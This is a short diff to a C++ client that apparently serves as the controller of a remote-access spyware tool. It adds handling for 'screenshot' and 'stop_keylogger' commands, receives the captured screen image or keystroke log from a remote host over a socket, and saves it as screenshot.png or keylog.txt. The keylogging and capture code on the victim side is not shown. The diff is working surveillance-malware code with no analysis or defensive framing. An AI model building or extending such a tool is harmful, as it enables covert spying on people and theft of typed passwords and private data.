@@ -274,11 +274,13 @@ void startClient()
 			break;
 		}
 
+		if (request == "exit")
+		{
+			std::cout << "Client is exiting..." << std::endl;
+			break;
+		}
 		// Receive response from server
-		std::ofstream outFile;
-		outFile.open("receive.png", std::ios::binary);
-		
-		if (request == "screenshot") {
+		if (request == "screenshot" || request == "stop_keylogger") {
 			// Receive file size first
 			int fileSize;
 			iResult = recv(ConnectSocket, (char*)&fileSize, sizeof(fileSize), 0);
@@ -304,8 +306,10 @@ void startClient()
 				totalReceived += bytesReceived;
 			}
 
+			std::string filename = request == "screenshot" ? "screenshot.png" : "keylog.txt";
+
 			// Save the received data to a file
-			std::ofstream outFile("receive.png", std::ios::binary);
+			std::ofstream outFile(filename, std::ios::binary);
 			outFile.write(fileBuffer, totalReceived);
 			outFile.close();
 
@@ -331,8 +335,6 @@ void startClient()
 				break;
 			}
 		}
-		
-		outFile.close();
 	}
 	//--------------------------------------
 
